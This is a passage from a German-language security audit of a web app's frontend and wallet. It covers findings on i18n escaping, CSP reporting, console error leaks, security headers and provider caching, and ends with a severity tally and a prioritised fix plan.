**2-Jahres-Begründung.** Die Liste ist gewachsen aus historischen Gründen (vermutlich vor dem Backend-Proxy-Switch). Sie bringt heute **null Nutzen** und 13 Exfil-Pfade Risiko. Aufräumen kostet 5 Minuten, Risk-Reduktion ist konkret: jeder XSS muss durch die `'self'`-Beschränkung exfiltrieren, was via SOP/CORS deutlich schwerer ist.

---

### F5.9 🟡 Minor — i18next `escapeValue: false` ohne ESLint-Schutz gegen `dangerouslySetInnerHTML`

**Files:**

- `packages/frontend/src/lib/i18n.ts:41`
- `packages/frontend/eslint.config.*` (kein `react/no-danger`)

**Problem.**

```ts
// i18n.ts:34-43
await i18n.use(initReactI18next).init({
  // ...
  interpolation: {
    escapeValue: false,
  },
})
```

i18next dokumentiert `escapeValue: false` als „React handles escaping". Das stimmt — solange ALLE `t(...)`-Aufrufe via React-Children gerendert werden. **Der Moment, in dem jemand `dangerouslySetInnerHTML={{ __html: t('foo.bar') }}` schreibt, ist die Sicherheits-Layer kaputt.**

i18n-Strings sind im Repo-Source (`de.json`/`en.json`) — aber:

1. PRs ändern i18n häufig (Übersetzungs-Updates).
2. Externe Übersetzer könnten zukünftig commit-Berechtigung bekommen.
3. Niemand reviewed einen Übersetzungs-PR mit XSS-Augenmerk.

Aktuell: 0 `dangerouslySetInnerHTML`-Stellen im gesamten Frontend (✅). Das verifiziert: das System ist heute safe. Aber es ist kein **strukturell** safer Zustand — der nächste Feature-PR kann es brechen.

**Fix.**

1. ESLint-Regel `react/no-danger` als `error` aktivieren:
   ```js
   // eslint.config.js
   rules: {
     'react/no-danger': 'error',
     'react/no-danger-with-children': 'error',
   }
   ```
2. **Plus**: `escapeValue: true` setzen (i18next escaped dann selbst, doppelter Schutz). Nachteil: HTML-Tags in Übersetzungen funktionieren nicht ohne Trans-Component. Aktuell scheint keine i18n-String HTML zu enthalten — Verifikation per Grep:
   ```bash
   rg -n '<[a-z]+>' packages/frontend/src/locales/
   ```
3. JSON-Schema für Locales mit `pattern: "^[^<>&]*$"` als CI-Test.

**2-Jahres-Begründung.** XSS-Bugs in i18n sind eine bekannte Klasse (siehe i18next CVE-2017-16114). Sie passieren nicht durch böse Absicht, sondern durch Übersetzungs-Tools, die HTML-Entities falsch encoden. Über 2 Jahre Wartung mit wechselnden Übersetzern = realistisches Risiko.

---

### F5.10 🟡 Minor — Kein CSP `report-uri` / `report-to` — blind im Produktionsbetrieb

**File:** `packages/backend/src/server.ts:45-71`

**Problem.** Die CSP-Konfig hat kein `report-uri` oder das modernere `report-to` direktiven:

```ts
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    // ...
    // KEIN reportUri, KEIN reportTo
  },
}
```

→ Wenn ein Browser eine CSP-Violation detected (z. B. ein Inline-Script im neu-eingespielten Feature, oder ein lecker XSS-Versuch von einem Angreifer), gibt es keinen Reporting-Endpunkt. Der Verstoß passiert silent, niemand erfährt davon. Operations-Team hat keine Ahnung, welche CSP-Direktiven in der Realität verletzt werden.

**Fix.**

1. Express-Endpunkt `/api/v1/csp-report` hinzufügen, der CSP-Violations entgegennimmt und in Pino-Logger schreibt.
2. CSP-Direktive ergänzen:
   ```ts
   reportUri: ['/api/v1/csp-report'],
   reportTo: ['csp-endpoint'],
   ```
3. `Reporting-Endpoints`-Header setzen (für `report-to`).

**2-Jahres-Begründung.** Ohne Reporting kann Operations nicht detecten:

- Welche legitime Funktion wird durch CSP gebrochen (= Bug-Source).
- Ob ein Angreifer XSS-Versuche fährt (= Indikator für Pen-Test oder echten Angriff).
- Wie man die CSP-Direktiven graduell härten kann (Daten-driven Tightening).

Jahresbudget: ~3.000 Helpdesk-Tickets HSBI-weit, davon werden jährlich sicher 1-2 von „die Seite tut nichts"-Tickets in Wahrheit CSP-Violations sein, die ohne Reporting-Daten nie gefunden werden.

---

### F5.11 🟡 Minor — `console.error` mit Backend-Errors leakt in Browser-DevTools

**File:** `packages/frontend/src/components/admin/role-management.tsx:56`

**Problem.**

```tsx
} catch (err) {
  console.error('Failed to fetch admins:', err)
}
```

Backend-Error-Objekte werden direkt in die Browser-Console geloggt. Im Falle von strukturierten Errors (z. B. mit Stack-Traces oder Inner-Exceptions) kann das interne Backend-Pfade, Versionen, RPC-Provider-Identitäten, Datenbank-Schemas etc. leaken. Bei einer offenen DevTools-Session sieht ein Schulter-Surfer diese Informationen.

Ähnliche Stellen sind über das Frontend verteilt (alle `console.error` in `catch`-Klauseln).

**Fix.**

1. Production-Build: `console.error`-Wrapper, der nur sanitized Messages durchlässt.
2. Ersetzen durch ein zentrales `logFrontendError(operation, err)` mit:
   ```ts
   function logFrontendError(op: string, err: unknown) {
     if (import.meta.env.DEV) console.error(`[${op}]`, err)
     // In Prod: nur die Message, kein Stack
     else console.error(`[${op}] ${err instanceof Error ? err.message : String(err)}`)
   }
   ```
3. Optional: Sentry/PostHog-Integration für aggregiertes Error-Tracking.

**2-Jahres-Begründung.** Information-Disclosure via Browser-Console ist Low-Severity, aber kumulativ relevant — über 2 Jahre wird das Backend wachsen, Error-Strukturen werden komplexer, und der Leak wird informativer. Defense-in-Depth.

---

### F5.12 🟡 Minor — Kein `Permissions-Policy` / `Cross-Origin-Opener-Policy`-Header

**File:** `packages/backend/src/server.ts:35-110`

**Problem.** Helmet wird in `server.ts:45` mit minimaler Config gestartet, was die meisten Helmet-Defaults aktiv lässt. Aber:

- `Permissions-Policy` (ehemals `Feature-Policy`): kein expliziter Block für `geolocation`, `camera`, `microphone`, `payment`, `usb`, etc. → Browser-Default ist „erlaubt mit User-Prompt".
- `Cross-Origin-Opener-Policy: same-origin` (COOP): nicht explizit gesetzt. Ohne COOP kann ein per `window.open()` geöffnetes Drittfenster über `window.opener` zurückgreifen — relevant für MetaMask-Popup-Sicherheit.
- `Cross-Origin-Embedder-Policy: require-corp` (COEP): nicht gesetzt. Notwendig für SharedArrayBuffer / WebCrypto-Hardening in Zukunft.

**Fix.**

```ts
import helmet from 'helmet'

const helmetMiddleware = helmet({
  contentSecurityPolicy: {
    /* ... */
  },
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginEmbedderPolicy: { policy: 'require-corp' },
  permittedCrossDomainPolicies: { permittedPolicies: 'none' },
  // Permissions-Policy via custom header (Helmet hat es noch nicht)
})

app.use(helmetMiddleware)
app.use((_req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), camera=(), microphone=(), payment=(), usb=(), interest-cohort=()',
  )
  next()
})
```

**2-Jahres-Begründung.** Defense-in-Depth gegen zukünftige Browser-API-Missbrauch-Pfade. COOP insbesondere relevant für MetaMask-Sicherheit (verhindert Tab-Hijacking-Angriffe über `window.opener`).

---

### F5.13 ⚪ Nit — `cachedProvider` Singleton bei `JsonRpcProvider`-Construction-Fehler bleibt halb-initialisiert

**File:** `packages/frontend/src/hooks/use-blockchain.ts:19-37`

**Problem.**

```ts
let cachedProvider: ethers.JsonRpcProvider | null = null
let cachedContract: ethers.Contract | null = null

function getContract() {
  if (!config.contractAddress) {
    throw new Error('Contract address not configured')
  }
  if (!cachedContract) {
    cachedProvider = new ethers.JsonRpcProvider(config.rpcUrl, undefined, {
      batchMaxCount: 1,
    })
    cachedContract = new ethers.Contract(config.contractAddress, SURVEY_POINTS_ABI, cachedProvider)
  }
  return cachedContract
}
```

Wenn `new ethers.JsonRpcProvider(config.rpcUrl, ...)` wirft (z. B. invalide URL), bleibt `cachedProvider` auf `null`, aber `cachedContract` ebenfalls `null`. Beim nächsten Call wird der Construction-Versuch wiederholt — funktional gleich, kein Cleanup-Problem. Aber wenn der Provider-Construction zwar succeded, aber das Contract-Construction wirft (z. B. invalide ABI), bleibt `cachedProvider` initialisiert, hält ggf. Network-Connections offen.

**Fix.** Try/catch + Cleanup:

```ts
if (!cachedContract) {
  try {
    const provider = new ethers.JsonRpcProvider(config.rpcUrl, undefined, { batchMaxCount: 1 })
    cachedContract = new ethers.Contract(config.contractAddress, SURVEY_POINTS_ABI, provider)
    cachedProvider = provider
  } catch (err) {
    cachedProvider = null
    cachedContract = null
    throw err
  }
}
```

**2-Jahres-Begründung.** Memory-/Connection-Leak ist klein. Aber sauberer Code = weniger Debugging-Surface in 2 Jahren.

---

### F5.14 ⚪ Nit — `cachedContract` invalidiert nicht bei Adress- oder RPC-URL-Wechsel zur Laufzeit

**File:** `packages/frontend/src/hooks/use-blockchain.ts:19-37`

**Problem.** Beide Singletons werden basierend auf `config.contractAddress` und `config.rpcUrl` (build-time-Konstanten) erstellt. Wenn diese sich zur Laufzeit ändern (z. B. via dynamischem Update), bleibt der Cache veraltet.

**Aktuell:** `config` wird via `import.meta.env.VITE_*` befüllt — diese sind build-time-konstant. Kein Live-Update-Pfad existiert. → Aktuell **nicht relevant**, aber Foot-Gun für zukünftige Multi-Tenant-/Multi-Chain-Architekturen.

**Fix.** Cache-Key auf `(contractAddress, rpcUrl)`-Tuple:

```ts
const cache = new Map<string, ethers.Contract>()

function getContract() {
  const key = `${config.contractAddress}|${config.rpcUrl}`
  if (!cache.has(key)) {
    const provider = new ethers.JsonRpcProvider(config.rpcUrl, undefined, { batchMaxCount: 1 })
    cache.set(key, new ethers.Contract(config.contractAddress, SURVEY_POINTS_ABI, provider))
  }
  return cache.get(key)!
}
```

**2-Jahres-Begründung.** Architektur-Foot-Gun bei zukünftiger Multi-Chain-Erweiterung. 5 Minuten Fix-Aufwand.

---

## Aus V1 obsolet geworden

**Bereich 5 hatte keinen V1-Audit** (`docs/audit/06-bereich-5-frontend-wallet.md` existiert nicht). Es gibt keine V1-Findings, die hier obsolet werden.

Cross-Reference zu V1-Bereichen 1-3:

- **V1 Bereich 1 Findings 1.1, 1.5, 1.7** (Smart-Contract-On-Chain-Secret) sind via V2-HMAC-Architektur obsolet — kein Frontend-Impact mehr.
- **V1 Bereich 2 Findings 2.4** (Klartext-Minter-Key) — irrelevant für Frontend, gilt für Bereich 2 V2.
- **V1 Bereich 3** existiert nicht.

---

## Severity-Tally Bereich 5

🔴 Blocker: 4 (F5.1, F5.2, F5.3, F5.4)
🟠 Major: 4 (F5.5, F5.6, F5.7, F5.8)
🟡 Minor: 4 (F5.9, F5.10, F5.11, F5.12)
⚪ Nit: 2 (F5.13, F5.14)

**Gesamt:** 14 Findings.

---

## Empfohlener Fix-Pfad

**Sofort (1 Tag, vor nächstem Klassen-Run):**

- **F5.2** Admin-Auth-Loop: 5-Zeilen-Fix in `admin.tsx`. Recently shipped, verlangt sofortigen Patch.
- **F5.3** CSP via `.htaccess`: Live-Test mit `curl -I` auf vpstunden.hsbi.de, dann `.htaccess`-Edit in `build-deploy-ci.sh`.
- **F5.5+F5.6** CSP-Direktiven `frame-ancestors`/`object-src`/`base-uri`/`form-action`: 4 Code-Zeilen in `server.ts`, kein Bruch zu erwarten.

**Kurzfristig (1 Woche):**

- **F5.1** Keystore-V3-Download: Edit `wallet.ts:191-208` + neuer `<DownloadKeyDialog>` mit Passwort-Feld + Import-Pfad in `wallet-dialogs.tsx` für Encrypted-JSON.
- **F5.4** iOS-Safari-Banner + FAQ + Claim-Flow-Import-Button.
- **F5.7** Re-Worded `dialogCheck`-Strings + Auto-Backup-Reminder nach Wallet-Erstellung.
- **F5.8** `connect-src`-Liste auf `'self'` reduzieren.

**Mittel-Term (2 Wochen):**

- **F5.9** ESLint `react/no-danger` + i18n `escapeValue: true` + JSON-Schema-Lock.
- **F5.10** CSP-Reporting-Endpunkt + Pino-Logger-Integration.
- **F5.11** Sanitized `console.error`-Wrapper.
- **F5.12** Permissions-Policy + COOP/COEP-Header.

**Langfristig / Architektur:**

- **F5.4 (Optional)** WebAuthn/Passkey-basierte Wallet-Derivation als Alternative zu localStorage.
- **F5.13+F5.14** Provider-Caching-Refactor zusammen mit Multi-Chain-Vorbereitung.

---

## Cross-Cutting-Hinweise für andere Bereiche

- **Bereich 2 (Backend Key Management):** F5.3 (Plesk-Static-Serve-Bypass) ist das gleiche Plesk-Tenant-Threat-Modell wie F4.5 (chmod auf `survey-keys.json`). Beide gehören in einen einzigen Plesk-Hardening-PR. Plus: Permissions-Policy/COOP-Header gelten auch für Admin-Endpoints.

- **Bereich 6 (Auth, Replay & Sign-Flows):** F5.2 (Admin-Auth-Loop) ist eine kritische Sign-Flow-UX-Schwäche, die strukturell den Trust-Boundary-Übergang zwischen Frontend-State und MetaMask-State falsch modelliert. Bereich 6 sollte explizit testen, dass Sign-Rejection (`User denied`) keinen Auto-Retry-Loop triggert. Plus: F5.4 (iOS-ITP) bedeutet, dass „selbst-Sign mit lokalem Wallet" ein unsicherer Auth-Mechanismus für >7-Tage-Inaktivität ist.

- **Bereich 7 (Deployment, Hosting & Operational Readiness):** F5.3 (CSP-Bypass), F5.10 (CSP-Reporting-Endpoint) und F5.12 (Permissions-Policy) gehören in den Plesk-Setup-Runbook. `.htaccess`-Hardening ist Deployment-Konfiguration. Plus: Live-Header-Test (`curl -I https://vpstunden.hsbi.de/`) als Post-Deploy-Smoke-Test.

- **Bereich 8 (Tests & CI):**
  - F5.2: Test für Admin-Auth-Loop bei MetaMask-Rejection (Vitest + jsdom + MetaMask-Mock).
  - F5.9: ESLint-Regel `react/no-danger` als Pre-Commit-Hook + CI-Step.
  - F5.10: CSP-Header-Smoke-Test in CI (e2e oder integration).
  - F5.13: Provider-Construction-Failure-Test in `use-blockchain.test.ts`.

- **Bereich 1 (Smart Contract V2):** F5.1 (Klartext-Privatekey-Download) hat Cross-Reference zu F1.1 (Minter hat ADMIN_ROLE): Wenn ein Studi-Wallet-Key kompromittiert wird (via F5.1) und der Studi zufällig auch Admin ist (kein technischer Block dafür), eskaliert das von „1 Wallet weg" zu „Survey-Lifecycle-Vollkontrolle".

---

**Audit abgeschlossen 2026-04-18.**
